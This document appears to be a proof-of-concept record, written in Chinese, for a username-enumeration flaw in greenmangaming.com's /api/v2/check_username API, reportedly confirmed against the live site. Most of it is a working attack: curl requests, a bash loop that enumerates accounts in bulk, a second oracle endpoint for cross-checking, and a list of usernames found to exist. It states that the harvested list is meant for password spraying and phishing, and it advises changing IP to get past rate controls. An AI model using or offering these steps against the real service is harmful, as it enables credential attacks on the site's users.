# greenmangaming.com /api/v2/check_username 免认证用户名存在性预言机（204/400 二值分叉，可批量枚举）

- **code**: greenmangaming-check-username-username-enum-oracle
- **kind**: poc
- **category**: info-leak
- **component**: greenmangaming.com 用户注册/账户 API（/api/v2/*）
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 于 www.greenmangaming.com 实测（finding_id=55, veredict=verified）：GET /api/v2/check_username?username=admin → HTTP 400 body "Username already exists. Please enter a different user name." (len=60)；username=zzqrandom987685 → HTTP 204 空体 (len=0)。连续 10 次请求无 429，无限速。root/moderator/steam/half/life2/ryan/test 均 400（存在），support/zzqrandom987685 204（可用），二值分叉稳定 → 判定为用户名存在性预言机。
- **path**: pocs/greenmangaming-check-username-username-enum-oracle/poc.http
- **tags**: greenmangaming, username-enum, user-oracle, info-leak, unauth, rest-api, no-ratelimit, registration
- **created_at**: 2026-11-11T14:35:35.161Z
- **engine**: https://www.greenmangaming.com

## 描述

greenmangaming.com 注册/账户 API 的 /api/v2/check_username 端点匿名可达，无需任何凭据/会话/XSRF 头，以二值回显暴露站内用户名是否存在：存在→HTTP 400 固定文案 "Username already exists. Please enter a different user name."；可用→HTTP 204 空体。无频率限制，可批量枚举有效账号清单，为后续口令喷洒/钓鱼提供账号枚举基础。附带第二条 oracle：/api/v2/query_reviews_by_username/<username>/1 存在用户返回 74B JSON 对象、不存在返回 4B null，可交叉验证。

## 用法

```
【前置】匿名可达，无需 cookie/token/XSRF；建议带浏览器 UA（$ARTEX_UA）。HTTPS 直连 www.greenmangaming.com。

【单发判据】
curl -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/check_username?username=admin"
  → HTTP 400，body: "Username already exists. Please enter a different user name."（存在）
curl -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/check_username?username=zzqrandom987685"
  → HTTP 204，body 空（不存在/可用）

【批量枚举】候选名逐条打，sleep 0.5~1s 即可（实测连续 10 次无 429）；判定只看状态码：400=存在，204=不存在。为主流口令喷洒准备账号清单。
for u in admin root support moderator ryan test; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -A "$ARTEX_UA" \
    "https://www.greenmangaming.com/api/v2/check_username?username=$u")
  echo "$u -> $code"
done

【第二条 oracle（交叉验证，可选）】/api/v2/query_reviews_by_username/<username>/1
  存在用户 → 200 + 74B JSON {"IsSuccess":true,"Bookmark":null,"Score":0,"TotalReviews":0,"Reviews":[]}
  不存在用户 → 200 + 4B null
  注意：/api/v2/query_reviews_by_user/<cloudNineId>/1 对任意数字 id（1/100/1000/999999）恒返回同一 74B 空对象，不是 oracle，别用它。

【常见失败原因】
- 未带 UA 或被 CDN 挑战：换浏览器 UA 重试；
- 返回 403/202 说明被边缘风控拦截，降速或换出口 IP；
- 204 与 400 的语义若未来反转，以「二者互斥且稳定复现」为判定标准，而非固定码值。
```

## 正文

```
# greenmangaming.com 用户名存在性预言机（/api/v2/check_username）

## 结论
GET /api/v2/check_username?username=<候选> 免认证可达，二值回显 = 用户名存在性预言机，
无速率限制（连续 10 次无 429），可批量枚举站内有效账号。

## 请求 / 响应
# 存在的用户名
GET /api/v2/check_username?username=admin HTTP/1.1
Host: www.greenmangaming.com
User-Agent: $ARTEX_UA

HTTP 400
Username already exists. Please enter a different user name.   # len=60

# 不存在的用户名
GET /api/v2/check_username?username=zzqrandom987685 HTTP/1.1
Host: www.greenmangaming.com
User-Agent: $ARTEX_UA

HTTP 204
(empty body)   # len=0

## 批量枚举示例
$ curl -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/check_username?username=admin"
-> 400 "Username already exists. Please enter a different user name."
$ curl -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/check_username?username=zzqrandom987685"
-> 204 (empty)
（连续 10 次请求无 429，限速缺失）
root/admin/moderator/steam/half/life2/ryan/test → 400（存在）
support/zzqrandom987685 → 204（可用）

## 第二条 oracle（交叉验证）
# 存在用户
GET /api/v2/query_reviews_by_username/admin/1
-> 200 {"IsSuccess":true,"Bookmark":null,"Score":0,"TotalReviews":0,"Reviews":[]}   # len=74

# 不存在用户
GET /api/v2/query_reviews_by_username/zzqnope12345/1
-> 200 null   # len=4

# 对照（不是 oracle）：/query_reviews_by_user/<cloudNineId>/1
# 对任意数字 id（1/100/1000/999999）恒返回同一 74B 空对象 → 无区分度

```
